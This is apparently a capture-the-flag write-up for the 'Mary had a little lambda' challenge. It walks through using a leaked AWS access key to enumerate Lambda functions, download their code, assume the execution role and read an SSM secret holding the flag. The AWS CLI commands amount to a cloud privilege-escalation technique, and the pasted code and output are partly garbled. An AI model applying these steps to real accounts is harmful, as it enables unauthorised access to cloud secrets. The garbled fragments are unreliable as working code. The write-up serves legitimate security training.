Mary had a little lambda
======================

- **Category**: misc
- **Difficulty**: medium
- **Author**: gyrospectre

The Ministry of Australian Research into Yaks (MARY) is the leading authority of yak
related research in Australia. They know a lot about long-haired domesticated cattle,
but unfortunately not a lot about information security.

They have been migrating their yak catalog application to a serverless, lambda based,
architecture in AWS, but in the process have accidentally exposed an access key used
by their admins. You've gotten a hold of this key, now use this access to uncover
MARY's secrets! 
### Handout files

- [./publish/access_key.txt](./publish/access_key.txt)
```
devopsadmin
aws_access_key_id=AKIAXXXXXXXXXXXXXXXX
aws_secret_access_key=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
region=us-east-1
```
---
## Solve
1. Install AWS Cli and configure a profile with access key credentials
```bash
$ aws configure --profile devopsadmin
AWS Access Key ID [None]: AKIAXXXXXXXXXXXXXXXX 
AWS Secret Access Key [None]:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
Default region name [None]: us-east-1
```
2. Start exploring what's available
```bash
$ aws lambda list-functions --profile devopsadmin
{
    "Functions": [
        {
            "FunctionName": "yakbase",
            "FunctionArn": "arn:aws:lambda:us-east-1:487266254163:function:yakbase",
            "Runtime": "python3.13",
            "Role": "arn:aws:iam::487266254163:role/lambda_role",
            "Handler": "yakbase.lambda_handler",
            "CodeSize": 623,
            "Description": "",
            "Timeout": 30,
            "MemorySize": 128,
            "LastModified": "2025-07-14T12:42:45.148+0000",
            "CodeSha256": "TJjcu+uixucgk+66VOvlNYdT4ifRe6bgdAQxWujMwVM=",
            "Version": "$LATEST",
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "6e45ccea-697d-4cd8-b606-67577b601b0b",
            "Layers": [
                {
                    "Arn": "arn:aws:lambda:us-east-1:487266254163:layer:main-layer:1",
                    "CodeSize": 689581
                }
            ],
            "PackageType": "Zip",
            "Architectures": [
                "x86_64"
            ],
$ aws lambda get-function --function-name yakbase --profile devopsadmin
{
    "Configuration": {
        "FunctionName": "yakbase",
        "FunctionArn": "arn:aws:lambda:us-east-1:487266254163:function:yakbase",
        "Runtime": "python3.13",
        "Role": "arn:aws:iam::487266254163:role/lambda_role",
        "Handler": "yakbase.lambda_handler",
        "CodeSize": 623,
        "Description": "",
        "Timeout": 30,
        "MemorySize": 128,
        "LastModified": "2025-07-14T12:42:45.148+0000",
        "CodeSha256": "TJjcu+uixucgk+66VOvlNYdT4ifRe6bgdAQxWujMwVM=",
        "Version": "$LATEST",
        "TracingConfig": {
            "Mode": "PassThrough"
        },
        "RevisionId": "6e45ccea-697d-4cd8-b606-67577b601b0b",
        "Layers": [
            {
                "Arn": "arn:aws:lambda:us-east-1:487266254163:layer:main-layer:1",
                "CodeSize": 689581
            }
        ],
        "State": "Active",
        "LastUpdateStatus": "Successful",
        "PackageType": "Zip",
        "Architectures": [
            "x86_64"
        ],
        "EphemeralStorage": {
            "Size": 512
        },
        "SnapStart": {
            "ApplyOn": "None",
            "OptimizationStatus": "Off"
        },
        "RuntimeVersionConfig": {
            "RuntimeVersionArn": "arn:aws:lambda:us-east-1::runtime:83a0b29e480e14176225231a6e561282aa7732a24063ebab771b15e4c1a2c71c"
        },
        "LoggingConfig": {
            "LogFormat": "Text",
            "LogGroup": "/aws/lambda/yakbase"
        }
    },
    "Code": {
        "RepositoryType": "S3",
        "Location": "https://prod-04-2014-tasks.s3.us-east-1.amazonaws.com/snapshots/487266254163/yakbase-f70d7c3a-5267-425f-8ed2-4c7a9497db04?versionId=AWtrEWcqRUhNouC7YHffyafILNKu2lrj&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEH4aCXVzLWVhc3QtMSJHMEUCIQDYBuyRHDzmfnKrR%2FMv1uLfCcyRzsGRJNWli%2FaCiRjvkQIgeaX5BcGv1YGUXKH1qv9C2JFNvxx0%2FBVmm%2FnCSRyhx%2BEqkgIIl%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw3NDk2Nzg5MDI4MzkiDL0M2DcVKqTjcrPrVyrmASi9gj4SD1BgUOeGjkNcqcjCC3h7pliaSbM%2Fh%2FZM3kyaaAsFd58kdT9gTLZvOgf2Uc4q4nomllvqrglbjUaHEJaYgH7B2ndTUVPRaUQBtrup6T9Fq7jDuBzZjouniKaiHoq4FzH8GQA37yz1D6QSe%2FwOHtSYDtOSB0FUNrA8W1kGBVvwWcw5QBI30WS9ZtMTYWm08IsEXs%2BR8D96FDM9RPej4CvDCP71jFYmfNUozkQtS9y0ppEuAvKGq%2F4am9u9fAVB7oFXiiGUv612AL3osUaKCwFujNJ271WVq7SxhA25hskJG4NLMKOJ68MGOo8B0FrJzxlttr6iDwA371pVEUMBwTHz%2BMGwiNpGXOFPoECRHD%2FW3X3gmhf%2B5kY8d%2FWbDNy7NsEtCD7zISQdOHH665ICGSbOer%2BtCx3xzRri9Wnl7F9XjPK%2FV8Ws5LJ0jkQkM2lgZLARvx7bGahWjCqnR6P6hXL8bflCgOjHmT6M0CZB0IsF9jFcJ8mmx%2Bu%2FQF4%3D&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20250719T050932Z&X-Amz-SignedHeaders=host&X-Amz-Expires=600&X-Amz-Credential=ASIA25DCYHY3UTNFTX4D%2F20250719%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature=a7323942c9bf3737c4781751f5e018027b88cb615e6c2bc4ee5a5ddca0dba879"
    },
    "Tags": {
        "Challenge": "Mary had a little lambda"
    }
}
$ wget "Location" # Retrievs yakbase.py

```

```python 
# yakbase.py
import os
import json
import logging
import boto3
import mysql.connector

logger = logging. getLogger()
logger.setLevel(logging. INFO)

def lambda_handler(event, context):
session = boto3. Session( )
ssm = session.client('ssm')

dbpass = ssm. get_parameter(Name="/production/database/password", WithDecryption=True) [ 'Parameter' ]['Value']

mydb = mysql. connector. connect(
host="10.10.1.1",
user="dbuser",
password=dbpass,
database="BovineDb"

cursor = mydb. cursor ( )
cursor. execute("SELECT * FROM bovines")

results = cursor . fetchall ( )

# For testing without the DB!
#results = [(1, 'Yak', 'Hairy' , False) , (2, 'Bison' , 'Large' , True) ]

numresults = len(results)
response = f"Database contains {numresults} bovines."

logger. info(response)

return {
statusCode' : 200,
'body' : response
```

3. Returned yakbase.py contains a variable using `ssm.get_paramater(Name="/production/database/password", WithDecryption=True)['Parameter']['Value']` and the function runs under Role:"arn:aws:iam::487266254163:role/lambda_role"
4. assuming the role from yakbase function
```bash
$ aws sts assume-role --role-arn arn:aws:iam::487266254163:role/lambda_role --role-session-name mysession --profile devopsadmin
```
5. Export access credentials
```bash
$ 
export AWS_ACCESS_KEY_ID=
export AWS_SECRET_ACCESS_KEY=
export AWS_SESSION_TOKEN=
```
6. Add these to `~/.aws/credentials`
7. Use `get-parameter` with the new assumed role to retrieve the flag
```bash
$ aws ssm get-parameter --name "/production/database/password" --with-decryption --profile devopsadmin
results = cursor. fetchall()
"Parameter": {
"Name": "/production/database/password",
"Type": "SecureString",
"Value": "DUCTF{. *# -- BosMutusOfTheTibetanPlateau -- # *. }",
nu"Version": 1, (results
re"LastModifiedDate": "2025-07-14T08:42:32.390000-04:00",
"ARN": "arn: aws : ssm:us-east-1:487266254163 : parameter/production/d
atabase/password",response)
"DataType": "text"
return
statusCode' : 200
```

